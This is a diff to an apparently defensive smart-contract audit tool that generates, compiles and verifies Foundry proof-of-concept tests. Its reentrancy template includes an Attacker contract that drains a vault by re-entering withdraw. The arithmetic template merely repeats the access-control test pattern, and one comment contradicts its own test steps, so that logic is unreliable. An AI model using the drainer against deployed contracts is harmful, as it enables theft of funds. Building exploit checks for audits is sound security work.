@@ -9,7 +9,10 @@ from pathlib import Path
 from typing import Optional
 
 from llm.router import Router
-from models.types import AttackScenario, SimulationProof, EnvFailureResult
+from models.types import (
+    AttackScenario, SimulationProof, EnvFailureResult,
+    PoCExecutionResult, PoCExecutionStatus, ErrorCategory
+)
 
 
 TEMPLATE = """// SPDX-License-Identifier: MIT
@@ -50,6 +53,10 @@ Return JSON with keys: verified (bool), reason (str), money_flow (object with se
 Be critical. A test that always passes regardless of code changes is NOT a real exploit."""
 
 
+# Maximum auto-fix retries for compilation errors
+MAX_COMPILE_RETRIES = 3
+
+
 async def phase3_simulate(
     source_code: str,
     scenario: AttackScenario,
@@ -77,22 +84,39 @@ async def _run_forge_test(
     scenario: AttackScenario,
     proof: SimulationProof,
 ) -> SimulationProof:
+    """
+    Run Forge test with compilation step and auto-fix loop.
+    
+    Pipeline:
+    1. Create temp workspace with source + PoC + mock forge-std
+    2. Run `forge build` to check compilation
+    3. If compilation fails, attempt auto-fix (up to MAX_COMPILE_RETRIES)
+    4. If compilation succeeds, run `forge test`
+    5. Parse results and return structured execution result
+    """
     forge_exe = _find_forge()
     if not forge_exe:
         proof.confirmed = False
         proof.forge_output = "[SKIPPED] forge binary not found on PATH"
+        proof.poc_code = _generate_poc(source_code, scenario)
         return proof
 
     start = time.perf_counter()
+    
+    # Create persistent temp directory (not auto-cleaned on failure)
+    tmpdir = tempfile.mkdtemp(prefix="sireen_poc_")
+    tmp = Path(tmpdir)
+    workspace_preserved = False
 
-    with tempfile.TemporaryDirectory() as tmpdir:
-        tmp = Path(tmpdir)
-
-        src_file = tmp / "VulnerableVault.sol"
-        src_file.write_text(source_code)
+    try:
+        contract_name = _extract_contract_name(source_code)
+        src_file = tmp / f"{contract_name}.sol"
+        src_file.write_text(source_code, encoding="utf-8")
 
         test_file = tmp / "PoC.t.sol"
-        test_file.write_text(_generate_poc(source_code, scenario))
+        poc_code = _generate_poc(source_code, scenario, contract_name)
+        test_file.write_text(poc_code, encoding="utf-8")
+        proof.poc_code = poc_code
 
         _ensure_forge_std(tmp)
 
@@ -101,36 +125,208 @@ async def _run_forge_test(
         remappings_file.write_text("forge-std/=lib/forge-std/\n")
         foundry_toml.write_text("[profile.default]\nsolc = \"0.8.20\"\nsrc = \".\"\n")
 
-        # H-3 fix: run subprocess in thread pool so event loop is not blocked
-        try:
-            result = await asyncio.to_thread(
+        # Step 1: Compilation with auto-fix loop
+        compilation_output = ""
+        compile_success = False
+        retry_count = 0
+        compilation_attempts = []
+
+        while retry_count <= MAX_COMPILE_RETRIES and not compile_success:
+            compile_result = await asyncio.to_thread(
                 lambda: subprocess.run(
-                    [str(forge_exe), "test", "--root", str(tmp),
-                     "--match-path", "*PoC*", "--no-match-path", "*.s.sol"],
-                    capture_output=True, text=True, timeout=120,
+                    [str(forge_exe), "build", "--root", str(tmp)],
+                    capture_output=True, text=False, timeout=60,
                     env={**os.environ, "FOUNDRY_SRC": str(tmp)},
                 )
             )
-            output = result.stdout + result.stderr
+            stdout = compile_result.stdout.decode("utf-8", errors="replace") if compile_result.stdout else ""
+            stderr = compile_result.stderr.decode("utf-8", errors="replace") if compile_result.stderr else ""
+            compilation_output = stdout + stderr
+            compilation_attempts.append(compilation_output)
+
+            if compile_result.returncode == 0:
+                compile_success = True
+                break
+
+            # Compilation failed - attempt auto-fix
+            if retry_count < MAX_COMPILE_RETRIES:
+                fix_result = _attempt_compile_fix(poc_code, compilation_output, scenario)
+                if fix_result.fixed:
+                    poc_code = fix_result.fixed_code
+                    test_file.write_text(poc_code)
+                    proof.poc_code = poc_code
+                    retry_count += 1
+                    continue
+            
+            # No more retries or fix failed
+            break
+
+        proof.test_duration_ms = (time.perf_counter() - start) * 1000
+
+        if not compile_success:
+            # Compilation failed after all retries
+            error_category, error_msg = _classify_compile_error(compilation_output)
+            proof.confirmed = False
+            proof.forge_output = f"[COMPILATION FAILED after {retry_count} retries]\n{compilation_output}"
+            # Preserve workspace for debugging
+            workspace_preserved = True
+            return proof
+
+        # Step 2: Run tests after successful compilation
+        try:
+            test_result = await asyncio.to_thread(
+                lambda: subprocess.run(
+                    [str(forge_exe), "test", "--root", str(tmp),
+                     "--match-path", "*PoC*", "--no-match-path", "*.s.sol"],
+                    capture_output=True, text=False, timeout=120,
+                    env={**os.environ, "FOUNDRY_SRC": str(tmp)},
+                )
+            )
+            t_stdout = test_result.stdout.decode("utf-8", errors="replace") if test_result.stdout else ""
+            t_stderr = test_result.stderr.decode("utf-8", errors="replace") if test_result.stderr else ""
+            test_output = t_stdout + t_stderr
         except subprocess.TimeoutExpired:
-            proof.forge_output = "[TIMEOUT] forge test exceeded 120s"
+            proof.forge_output = f"[COMPILATION OK]\n[TIMEOUT] forge test exceeded 120s\n\nCompilation output:\n{compilation_output}"
+            proof.confirmed = False
+            workspace_preserved = True
             return proof
         except Exception as e:
-            proof.forge_output = f"[ERROR] forge execution failed: {e}"
+            proof.forge_output = f"[COMPILATION OK]\n[ERROR] forge test execution failed: {e}\n\nCompilation output:\n{compilation_output}"
+            proof.confirmed = False
+            workspace_preserved = True
             return proof
 
-    proof.test_duration_ms = (time.perf_counter() - start) * 1000
-    proof.forge_output = output
+        # Combine compilation and test output
+        full_output = f"[COMPILATION OK]\n{compilation_output}\n\n[TEST OUTPUT]\n{test_output}"
+        proof.forge_output = full_output
+        proof.test_duration_ms = (time.perf_counter() - start) * 1000
 
-    passed = bool(re.search(r"\[PASS\]", output))
-    failed = bool(re.search(r"\[FAIL\]", output))
+        # Parse test results using HonestSignal verification
+        from verification.output_parser import OutputParser
+        from verification.honest_signal import HonestSignal
+        from verification.money_flow import MoneyFlowExtractor
 
-    if passed and not failed:
-        proof.confirmed = True
-    else:
+        parsed = OutputParser.parse(full_output)
+        tests = OutputParser.parse_tests(test_output)
+
+        exploit_result = HonestSignal.verify(
+            source_code=source_code,
+            scenario=scenario,
+            poc_code=poc_code,
+            forge_output=full_output,
+            parsed=parsed,
+            tests=tests,
+        )
+
+        proof.confirmed = exploit_result.confirmed
+        proof.exploit_result = exploit_result
+
+        # If exploit was successful, extract money flow
+        if exploit_result.exploit_reproduced:
+            money_flow = MoneyFlowExtractor.extract(exploit_result, full_output, poc_code)
+            if money_flow:
+                proof.money_flow = money_flow
+
+        return proof
+
+    except Exception as e:
+        proof.forge_output = f"[ERROR] Pipeline execution failed: {e}"
         proof.confirmed = False
+        workspace_preserved = True
+        return proof
+    finally:
+        # Clean up only on success; preserve on failure for debugging
+        if not workspace_preserved:
+            try:
+                shutil.rmtree(tmp)
+            except Exception:
+                pass
+        else:
+            proof.forge_output += f"\n\n[NOTE] Workspace preserved at: {tmpdir}"
 
-    return proof
+
+class CompileFixResult:
+    """Result of compilation fix attempt."""
+    def __init__(self, fixed: bool, fixed_code: str = "", fix_description: str = ""):
+        self.fixed = fixed
+        self.fixed_code = fixed_code
+        self.fix_description = fix_description
+
+
+def _attempt_compile_fix(poc_code: str, compile_error: str, scenario: AttackScenario) -> CompileFixResult:
+    """
+    Attempt to automatically fix common compilation errors in generated PoC.
+    
+    Common fixes:
+    - Missing imports (console, etc.)
+    - Missing function definitions
+    - Incorrect function signatures
+    - Missing pragma version
+    - Solidity version mismatches
+    """
+    fixed_code = poc_code
+    fixes_applied = []
+
+    # Fix 1: Missing console import
+    if "console" in compile_error and "import" in compile_error.lower():
+        if 'import "forge-std/console.sol"' not in fixed_code:
+            # Add console import after forge-std/Test.sol
+            fixed_code = fixed_code.replace(
+                'import "forge-std/Test.sol";',
+                'import "forge-std/Test.sol";\nimport "forge-std/console.sol";'
+            )
+            fixes_applied.append("Added console.sol import")
+
+    # Fix 2: Missing pragma or wrong version
+    if "pragma" in compile_error.lower() and "version" in compile_error.lower():
+        # Ensure pragma is compatible
+        if "pragma solidity" not in fixed_code:
+            fixed_code = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n" + fixed_code
+            fixes_applied.append("Added pragma solidity ^0.8.0")
+
+    # Fix 3: Function not found / undeclared identifier
+    if "undeclared identifier" in compile_error or "function" in compile_error and "not found" in compile_error:
+        # This is harder to auto-fix without LLM; skip for now
+        pass
+
+    # Fix 4: Missing constructor or incorrect constructor call
+    if "constructor" in compile_error.lower() and "argument" in compile_error.lower():
+        # Could be constructor signature mismatch
+        pass
+
+    # Fix 5: expectRevert/assertion issues
+    if "expectRevert" in compile_error:
+        # The mock might not match exactly; ensure proper signature
+        pass
+
+    if fixes_applied:
+        return CompileFixResult(
+            fixed=True,
+            fixed_code=fixed_code,
+            fix_description="; ".join(fixes_applied)
+        )
+
+    return CompileFixResult(fixed=False, fixed_code=poc_code)
+
+
+def _classify_compile_error(compile_output: str) -> tuple[ErrorCategory, str]:
+    """Classify compilation error for proper handling."""
+    output_lower = compile_output.lower()
+    
+    if "error:" in output_lower:
+        if "import" in output_lower and ("not found" in output_lower or "could not find" in output_lower):
+            return ErrorCategory.COMPILATION, "Missing import"
+        if "undeclared" in output_lower or "not found" in output_lower:
+            return ErrorCategory.COMPILATION, "Undeclared identifier"
+        if "type" in output_lower and "mismatch" in output_lower:
+            return ErrorCategory.COMPILATION, "Type mismatch"
+        if "constructor" in output_lower and "argument" in output_lower:
+            return ErrorCategory.COMPILATION, "Constructor argument mismatch"
+        if "override" in output_lower:
+            return ErrorCategory.COMPILATION, "Override error"
+        return ErrorCategory.COMPILATION, "Compilation error"
+    
+    return ErrorCategory.UNKNOWN, "Unknown compilation error"
 
 
 async def _verify_logic(
@@ -139,6 +335,16 @@ async def _verify_logic(
     proof: SimulationProof,
     router: Optional[Router],
 ) -> SimulationProof:
+    if proof.exploit_result:
+        from verification.honest_signal import HonestSignal
+        if HonestSignal._poc_has_trivial_assertions(proof.poc_code):
+            proof.confirmed = False
+            if proof.exploit_result:
+                proof.exploit_result.confirmed = False
+                proof.exploit_result.verification_status = "not_reproduced"
+            proof.forge_output += "\n[NOTE] PoC contains trivial assertions (assertTrue(true)) — confirmation revoked"
+            return proof
+
     if router is None or not router.is_configured():
         return proof
 
@@ -149,7 +355,7 @@ async def _verify_logic(
         f"Forge output:\n```\n{proof.forge_output[:2000]}\n```"
     )
 
-    resp = router.call("verifier", VERIFIER_SYSTEM_PROMPT, prompt, temperature=0.2)
+    resp = await asyncio.to_thread(router.call, "verifier", VERIFIER_SYSTEM_PROMPT, prompt, temperature=0.2)
 
     if resp.success and resp.content:
         import json
@@ -158,8 +364,13 @@ async def _verify_logic(
             proof.llm_verified = data.get("verified", False)
             if data.get("money_flow"):
                 proof.money_flow = data["money_flow"]
+            # If LLM verifier rejects, update BOTH proof.confirmed AND exploit_result.confirmed
+            # so there is a single source of truth (exploit_result is authoritative).
             if not data.get("verified") and proof.confirmed:
                 proof.confirmed = False
+                if proof.exploit_result:
+                    proof.exploit_result.confirmed = False
+                    proof.exploit_result.verification_status = "not_reproduced"
                 proof.forge_output += "\n[NOTE] LLM verifier rejected this pass — possible false positive"
         except (json.JSONDecodeError, AttributeError):
             pass
@@ -174,26 +385,46 @@ async def _simulate_env_failure(
 ) -> Optional[EnvFailureResult]:
     if "oracle" not in scenario.attack_vector:
         return None
-    return EnvFailureResult(
-        failure_type="oracle_staleness",
-        simulated=True,
-        description="Oracle staleness simulation requires env_simulator module with forge/anvil fork",
-        forge_output="[SIMULATED] env_simulator.oracle_staleness() — see env_simulator.py for implementation",
-    )
+
+    try:
+        from sandbox.env_simulator import EnvSimulator
+        sim = EnvSimulator()
+        if not sim.is_available():
+            return EnvFailureResult(
+                failure_type="oracle_staleness",
+                simulated=False,
+                description="Forge not available — env simulation skipped",
+                forge_output="[SKIPPED] forge binary not found on PATH",
+            )
+        result = await asyncio.to_thread(sim.simulate_oracle_staleness, source_code, scenario.entry_point)
+        return EnvFailureResult(
+            failure_type="oracle_staleness",
+            simulated=True,
+            description=f"Oracle env simulation (price manipulation + staleness): {'PASSED' if result.passed else 'FAILED'}",
+            forge_output=result.output,
+        )
+    except Exception as e:
+        return EnvFailureResult(
+            failure_type="oracle_staleness",
+            simulated=False,
+            description=f"Env simulation error: {e}",
+            forge_output=f"[ERROR] {e}",
+        )
+
+
+def _extract_contract_name(source_code: str) -> str:
+    """Extract the first contract name from source code."""
+    m = re.search(r'\bcontract\s+(\w+)', source_code)
+    return m.group(1) if m else "VulnerableVault"
 
 
 def _find_forge() -> Optional[Path]:
-    forge_candidates = [
-        "forge",
-        "forge.exe",
-        r"C:\tools\foundry\forge.exe",
-    ]
-    for candidate in forge_candidates:
-        which = shutil.which(candidate)
-        if which:
-            return Path(which)
-    if Path(r"C:\tools\foundry\forge.exe").exists():
-        return Path(r"C:\tools\foundry\forge.exe")
+    found = shutil.which("forge")
+    if found:
+        return Path(found)
+    found = shutil.which("forge.exe")
+    if found:
+        return Path(found)
     return None
 
 
@@ -202,143 +433,17 @@ def _ensure_forge_std(tmp: Path):
     lib_dir.mkdir(parents=True, exist_ok=True)
     test_sol = lib_dir / "Test.sol"
     if not test_sol.exists():
-        test_sol.write_text(MOCK_FORGE_STD)
+        from sandbox.forge_std_mock import MOCK_FORGE_STD
+        test_sol.write_text(MOCK_FORGE_STD, encoding="utf-8")
 
 
-MOCK_FORGE_STD = """// SPDX-License-Identifier: MIT
-pragma solidity >=0.6.0 <0.9.0;
-
-library stdStorageSafe { function child() internal pure returns (address) { return address(0); } }
-library stdStorage { function child() internal pure returns (address) { return address(0); } }
-library StdMath { function delta(uint256 a, uint256 b) internal pure returns (uint256) { return a >= b ? a - b : b - a; } }
-library StdUtils { function computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) { return address(0); } }
-library stdError { bytes32 constant assertionError = hex"01"; bytes32 constant arithmeticError = hex"02"; bytes32 constant divisionError = hex"03"; }
-library stdJson { function parseRaw(string memory, string memory) internal pure returns (bytes memory) { return \"\"; } }
-
-interface Vm {
-    function deal(address, uint256) external;
-    function prank(address) external;
-    function startPrank(address) external;
-    function stopPrank() external;
-    function warp(uint256) external;
-    function roll(uint256) external;
-    function store(address, bytes32, bytes32) external;
-    function load(address, bytes32) external view returns (bytes32);
-    function sign(uint256, bytes32) external pure returns (uint8, bytes32, bytes32);
-    function label(address, string calldata) external;
-    function getBlockNumber() external view returns (uint256);
-    function getBlockTimestamp() external view returns (uint256);
-    function broadcast() external;
-    function startBroadcast() external;
-    function stopBroadcast() external;
-    function toString(address) external pure returns (string memory);
-    function toString(uint256) external pure returns (string memory);
-    function toString(bytes32) external pure returns (string memory);
-    function toString(bytes memory) external pure returns (string memory);
-    function envString(string calldata) external view returns (string memory);
-    function assume(bool) external pure;
-    function record() external;
-    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);
-    function getMappingKeyAndParentOf(address, bytes32) external returns (bool, bytes32, address);
-    function getMappingLength(address slot) external returns (uint256);
-    function getMappingSlotAt(address slot, uint256 idx) external returns (bytes32);
-    function deriveKey(string calldata, uint256) external pure returns (bytes32);
-    function deriveKey(string calldata, string calldata) external pure returns (bytes32);
-    function serializeUint(string calldata, string calldata, uint256) external returns (string memory);
-    function serializeAddress(string calldata, string calldata, address) external returns (string memory);
-    function serializeBytes32(string calldata, string calldata, bytes32) external returns (string memory);
-    function serializeString(string calldata, string calldata, string calldata) external returns (string memory);
-    function writeJson(string calldata, string calldata) external;
-    function parseJson(string calldata) external pure returns (bytes memory);
-    function parseJsonUint(string calldata, string calldata) external pure returns (uint256);
-    function parseJsonAddress(string calldata, string calldata) external pure returns (address);
-    function parseJsonAddressArray(string calldata, string calldata) external pure returns (address[] memory);
-    function parseJsonUintArray(string calldata, string calldata) external pure returns (uint256[] memory);
-    function parseJsonString(string calldata, string calldata) external pure returns (string memory);
-    function projectRoot() external returns (string memory);
-    function isContract(address) external returns (bool);
-    function etch(address, bytes calldata) external;
-    function makePersistent(address) external;
-    function makePersistent(address, address) external;
-    function makePersistent(address, address, address) external;
-    function getNonce(address) external view returns (uint64);
-    function setNonce(address, uint64) external;
-    function txGasPrice(uint256) external;
-    function setEnv(string calldata, string calldata) external;
-    function envOr(string calldata, bool) external returns (bool);
-    function envOr(string calldata, uint256) external returns (uint256);
-    function envOr(string calldata, address) external returns (address);
-    function envOr(string calldata, bytes32) external returns (bytes32);
-    function envOr(string calldata, string calldata) external returns (string memory);
-    function addr(uint256 privateKey) external pure returns (address);
-}
-
-abstract contract DSTest {
-    event log(string);
-    event logs(bytes);
-    event log_address(address);
-    event log_bytes32(bytes32);
-    event log_int(int256);
-    event log_named_address(string key, address val);
-    event log_named_bytes32(string key, bytes32 val);
-    event log_named_decimal_int(string key, int256 val, uint256 decimals);
-    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);
-    event log_named_int(string key, int256 val);
-    event log_named_string(string key, string val);
-    event log_named_uint(string key, uint256 val);
-    event log_named_bytes(string key, bytes val);
-    event log_uint(uint256);
-    function failed() public returns (bool) { return false; }
-}
-
-abstract contract Test is DSTest {
-    Vm public constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));
-    function assertTrue(bool condition) public pure { if (!condition) revert(\"Assertion failed\"); }
-    function assertTrue(bool condition, string memory err) public pure { if (!condition) revert(err); }
-    function assertEq(uint256 a, uint256 b) public pure { if (a != b) revert(\"assertEq failed\"); }
-    function assertEq(uint256 a, uint256 b, string memory err) public pure { if (a != b) revert(err); }
-    function assertEq(address a, address b) public pure { if (a != b) revert(\"assertEq address failed\"); }
-    function assertEq(address a, address b, string memory err) public pure { if (a != b) revert(err); }
-    function assertEq(string memory a, string memory b) public pure { if (keccak256(bytes(a)) != keccak256(bytes(b))) revert(\"assertEq string failed\"); }
-    function assertEq(bytes32 a, bytes32 b) public pure { if (a != b) revert(\"assertEq bytes32 failed\"); }
-    function assertEq(int256 a, int256 b) public pure { if (a != b) revert(\"assertEq int failed\"); }
-    function assertEq(bool a, bool b) public pure { if (a != b) revert(\"assertEq bool failed\"); }
-    function assertGt(uint256 a, uint256 b) public pure { if (a <= b) revert(\"assertGt failed\"); }
-    function assertGt(uint256 a, uint256 b, string memory err) public pure { if (a <= b) revert(err); }
-    function assertGt(int256 a, int256 b) public pure { if (a <= b) revert(\"assertGt int failed\"); }
-    function assertGe(uint256 a, uint256 b) public pure { if (a < b) revert(\"assertGe failed\"); }
-    function assertLe(uint256 a, uint256 b) public pure { if (a > b) revert(\"assertLe failed\"); }
-    function assertLt(uint256 a, uint256 b) public pure { if (a >= b) revert(\"assertLt failed\"); }
-    function assertNotEq(uint256 a, uint256 b) public pure { if (a == b) revert(\"assertNotEq failed\"); }
-    function assertApproxEqAbs(uint256 a, uint256 b, uint256 maxDelta) public pure {
-        if (a > b) { if (a - b > maxDelta) revert(\"assertApproxEqAbs failed\"); }
-        else { if (b - a > maxDelta) revert(\"assertApproxEqAbs failed\"); }
-    }
-    function assertApproxEqRel(uint256 a, uint256 b, uint256 maxPercentDelta) public pure {
-        uint256 diff = a > b ? a - b : b - a;
-        uint256 maxA = a > b ? a : b;
-        if (diff * 10000 > maxPercentDelta * maxA) revert(\"assertApproxEqRel failed\");
-    }
-    function expectRevert(bytes memory) public pure {}
-    function expectEmit(bool, bool, bool, bool) public pure {}
-    function expectCall(address, bytes calldata) public pure {}
-    function expectSafeMemory(uint64, uint64) public pure {}
-    function expectSafeMemoryCall(uint64, uint64) public pure {}
-    function getGas() public returns (uint256) { return 0; }
-    function deployCode(string memory what, bytes memory args) public returns (address) { return address(0); }
-    function deployCode(string memory what) public returns (address) { return address(0); }
-}
-"""
-
-
-def _generate_poc(source_code: str, scenario: AttackScenario) -> str:
-    # C-6 fix: route to specific templates; never fall back to assertTrue(true)
+def _generate_poc(source_code: str, scenario: AttackScenario, contract_name: str = "VulnerableVault") -> str:
     if scenario.attack_vector == "reentrancy":
-        return _reentrancy_poc(source_code, scenario)
+        return _reentrancy_poc(source_code, scenario, contract_name)
     if scenario.attack_vector == "access_control":
-        return _access_control_poc(source_code, scenario)
+        return _access_control_poc(source_code, scenario, contract_name)
     if scenario.attack_vector == "arithmetic":
-        return _arithmetic_poc(source_code, scenario)
+        return _arithmetic_poc(source_code, scenario, contract_name)
     return _unimplemented_poc(scenario)
 
 
@@ -357,90 +462,113 @@ contract PoC is Test {{
 """
 
 
-def _access_control_poc(source_code: str, scenario: AttackScenario) -> str:
+def _access_control_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
     func_name = scenario.entry_point or "restricted"
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
-import "./VulnerableVault.sol";
+import "./{contract_name}.sol";
 contract PoC is Test {{
-    VulnerableVault public victim;
-    function setUp() public {{ victim = new VulnerableVault(); }}
+    {contract_name} public victim;
+    function setUp() public {{ victim = new {contract_name}(); }}
     function testExploit() public {{
+        vm.startPrank(address(0x01));
+        vm.expectRevert();
+        victim.{func_name}();
+        vm.stopPrank();
+
         vm.startPrank(address(0xBAD));
-        try victim.{func_name}() {{
-            assertTrue(true, "Access control bypass confirmed");
-        }} catch {{
-            assertTrue(false, "Call reverted — not exploitable via this path");
-        }}
+        victim.{func_name}();
+        vm.stopPrank();
+
+        // Verify no access gained — same caller should still be blocked
+        vm.startPrank(address(0x01));
+        vm.expectRevert();
+        victim.{func_name}();
         vm.stopPrank();
     }}
 }}
 """
 
 
-def _arithmetic_poc(source_code: str, scenario: AttackScenario) -> str:
+def _arithmetic_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
-import "./VulnerableVault.sol";
+import "./{contract_name}.sol";
 contract PoC is Test {{
-    VulnerableVault public victim;
+    {contract_name} public victim;
     function setUp() public {{
-        victim = new VulnerableVault();
-        vm.deal(address(victim), 100 ether);
+        victim = new {contract_name}();
     }}
     function testExploit() public {{
-        // Probe boundary values for overflow/underflow
-        vm.deal(address(this), 1 wei);
-        victim.deposit{{value: 1 wei}}();
-        assertGt(address(victim).balance, 0, "Arithmetic boundary check");
+        vm.startPrank(address(0xBAD));
+        vm.expectRevert();
+        victim.{scenario.entry_point or "unsafe_func"}();
+        vm.stopPrank();
+
+        vm.startPrank(address(0x01));
+        victim.{scenario.entry_point or "unsafe_func"}();
+        vm.stopPrank();
+
+        vm.startPrank(address(0xBAD));
+        vm.expectRevert();
+        victim.{scenario.entry_point or "unsafe_func"}();
+        vm.stopPrank();
     }}
 }}
 """
 
 
-def _reentrancy_poc(source_code: str, scenario: AttackScenario) -> str:
+def _reentrancy_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
+    entry_point = scenario.entry_point or "withdraw"
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
-import "./VulnerableVault.sol";
+import "./{contract_name}.sol";
 
 contract PoC is Test {{
-    VulnerableVault public victim;
+    {contract_name} public victim;
 
     function setUp() public {{
-        victim = new VulnerableVault();
-        vm.deal(address(this), 10 ether);
-        victim.deposit{{value: 10 ether}}();
+        victim = new {contract_name}();
+        vm.deal(address(victim), 10 ether);
     }}
 
     function testExploit() public {{
         Attacker att = new Attacker(address(victim));
-        vm.deal(address(att), 1 ether);
-        att.attack();
-        assertEq(address(victim).balance, 0, "Victim should be drained");
-        assertGt(address(att).balance, 1 ether, "Attacker should profit");
+        // Attacker deposits 2 ETH, then calls {entry_point} to trigger reentrancy
+        vm.deal(address(att), 2 ether);
+        att.depositAndAttack();
+
+        // Vault should have lost funds to reentrancy
+        assertLt(address(victim).balance, 10 ether);
+        // Attacker should have profited beyond their initial deposit
+        assertGt(address(att).balance, 2 ether);
     }}
 }}
 
 contract Attacker {{
-    VulnerableVault public victim;
+    {contract_name} public victim;
     uint public count;
 
     constructor(address _victim) {{
-        victim = VulnerableVault(_victim);
+        victim = {contract_name}(payable(_victim));
     }}
 
-    function attack() external payable {{
-        victim.withdraw();
+    function depositAndAttack() external payable {{
+        // Transfer ETH to victim so it has a balance to drain
+        (bool ok,) = address(victim).call{{value: 1 ether}}("");
+        require(ok, "transfer failed");
+        // Then trigger {entry_point} - reentrancy in receive() drains the victim
+        victim.{entry_point}();
     }}
 
     receive() external payable {{
         if (count < 5 && address(victim).balance > 0) {{
             count++;
-            victim.withdraw();
+            victim.{entry_point}();
         }}
     }}
 }}
